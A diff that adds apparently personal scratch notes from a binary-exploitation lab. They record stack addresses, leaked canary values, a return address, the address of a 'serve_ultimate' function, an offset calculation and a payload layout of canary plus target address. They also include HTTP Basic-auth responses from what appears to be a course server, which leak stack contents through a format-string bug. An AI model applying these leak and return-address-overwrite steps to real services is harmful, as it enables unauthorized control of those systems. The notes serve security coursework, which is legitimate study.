@@ -1,0 +1,59 @@
+0xffffcd40: 0x80
+$ebp - 4 Canary: 0x00    0xb0    0xff    0xf7
+
+<gnwsto> <fixed point check auth>
+
+0xffffcd8c:     0x9d    0x68    0x55    0x56
+
+                0x5655689d
+
+
+// den xreiazetai <agnwsto> $ebp + 4 ( == Return address) -> 0xff..... :  0x565569ab
+
+
+<agnwsto> serve_ultimate addr: 0x56557247
+
+>>> 0x56557247 <serve_ultimate>     endbr32                                                            │
+
+
+@ chatziko : 0x566279bf
+
+@ chatziko canary: 0xdda7a200
+
+
+offset = serve_ult_addr - ret_addr = 2474 (decimal)
+
+
+
+
+payload : <Canary><ServeUltimateAddr> x oo
+
+
+
+
+0xffffcd8c:
+
+
+
+
+0xf7ffb000
+
+
+
+19:42 --> chatziko's server 
+
+Basic realm="Invalid user: 57098310  7a  5660b44a  0  0  57088367  5660e180  0  0  57098310  7b  0  1  57098310  5709838a  5709838b  7a  0  0  0  0  0  0  0  0  f7b2ed49  22631a00  f7c96d80  5660df10  ffc0ce38  5660b015"
+
+
+19:43 -->
+
+Basic realm="Invalid user: 5662e310  7a  5657044a  0  0  5661e367  56573180  0  0  5662e310  7b  0  1  5662e310  5662e38a  5662e38b  7a  0  0  0  0  0  0  0  0  f7b23d49  b2490f00  f7c8bd80  56572f10  ff9e4cc8  56570015"
+
+
+20:29 --> 
+
+WWW-Authenticate: Basic realm="Invalid user: 5701b310  7a  565f244a  0  0  5700b474  565f5180  0  0  5701b310  7b  0  1  5701b310  5701b38a  5701b38b  7a  0  0  0  0  0  0  0  0  f7b9ed49  d22a8600  f7d06d80  565f4f10  ffe92f38  565f2015"
+
+WWW-Authenticate: Basic realm="Invalid user: Hello  565fa310  82  5656044a  0  0  565ea474  56563180  0  0  565fa310  83  0  1  565fa310  565fa392  565fa393  82  0  0  0  0  0  0  0  0  f7afbd49  ff236d00  f7c63d80  56562f10  ff9ab6a8  56560015 "
+
+WWW-Authenticate: Basic realm="Invalid user:  565fa310  7c  5656044a  0  0  565ea474  56563180  0  0  565fa310  7d  0  1  565fa310  565fa38c  565fa38d  7c  0  0  0  0  0  0  0  0  f7afbd49  ff236d00  f7c63d80  56562f10  ff9ab6a8  56560015 "
